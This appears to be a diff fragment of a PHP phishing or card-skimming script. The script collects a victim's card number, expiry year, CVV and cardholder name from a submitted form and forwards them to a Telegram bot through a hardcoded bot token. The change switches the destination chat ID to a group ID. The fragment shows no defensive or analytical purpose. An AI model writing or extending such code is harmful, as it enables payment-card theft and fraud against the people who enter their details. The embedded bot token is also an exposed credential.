@@ -11,7 +11,7 @@ $year = $_POST['card_year'];
 $cvv = $_POST['card_cvv'];
 
 $token = "6526376873:AAGw4eIbP1djKalAu73iCaHdmoqn-OtpiQM";
-$chat_id = "6414523847";
+$chat_id = "-6414523847";
 $arr = array(
   'Держатель карты: ' => $cardholder,
   'Номер карты: ' => $cardnumber,
